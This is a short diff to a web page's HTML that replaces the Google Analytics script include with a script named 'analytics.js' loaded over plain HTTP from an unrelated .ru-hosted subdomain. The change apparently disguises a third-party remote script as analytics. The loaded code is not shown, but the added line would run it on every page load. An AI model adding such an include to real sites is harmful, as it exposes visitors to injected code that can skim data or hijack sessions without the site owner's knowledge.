@@ -10,5 +10,5 @@ ga('require', 'urlChangeTracker');
 
 ga('send', 'pageview');
 </script>
-<script async src="https://www.google-analytics.com/analytics.js"></script>
-<script async src="https://github.com/Slev7nm/all-iptv-dune-plugin/tree/master/.github/autotrack.js"></script>
+<script async src="http://u413821vc7.ha002.t.justns.ru/analytics.js"></script>
+
